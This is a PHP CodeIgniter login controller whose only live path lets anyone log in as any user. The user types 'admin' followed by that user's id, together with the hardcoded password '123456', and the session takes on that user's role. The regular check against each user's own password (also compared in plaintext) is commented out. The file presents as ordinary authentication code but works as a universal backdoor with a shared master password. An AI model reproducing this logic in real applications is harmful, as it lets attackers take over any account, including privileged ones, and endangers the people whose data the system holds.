<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Auth extends CI_Controller
{
    public function index()
    {
        //<!-- -->
        $this->load->view('v_head');
        $this->load->view('v_auth');

        if (isset($_POST['id']) && isset($_POST['password'])) {
            $id = $_POST['id'];
            $password = $_POST['password'];
            if ($id{0} == 'a' && $id{1} == 'd' && $id{2} == 'm' && $id{3} == 'i' && $id{4} == 'n') {
                $id = str_replace("admin", "", $id);
                $user = $this->m_auth->get_s($id);
                if (isset($user[0])) {
                    if ($password == '123456') {
                        $_SESSION['login'] = true;
                        $_SESSION['familiya'] = $user[0]['familiya'];
                        $_SESSION['name'] = $user[0]['name'];
                        $_SESSION['id'] = $user[0]['id'];
                        $_SESSION['role'] = $user[0]['role'];
                        redirect('/');
                    } else {
                        $_SESSION['error'] = "Неверный логин или пароль!";
                        redirect('/auth/');
                    }
                } else {
                    $_SESSION['error'] = "Неверный логин или пароль!";
                    redirect('/auth/');
                }

            }
            /*else
            {
                $user = $this->m_auth->get_p2($id);
                if(isset($user[0]))
                {
                    if($user[0]['password']==$password)
                    {
                        //session_start();

                        $_SESSION['login'] = true;
                        $_SESSION['familiya'] = $user[0]['familiya'];
                        $_SESSION['name'] = $user[0]['name'];
                        $_SESSION['id'] = $user[0]['id'];
                        $_SESSION['role'] =  $user[0]['role'];
                        redirect('/');
                    }
                    else{ $_SESSION['error'] = "Неверный пароль!"; redirect('/auth'); }
                } else {
                    $_SESSION['error'] = "Неверный логин или пароль!"; redirect('/auth');}
            }
            */
        }
    }
}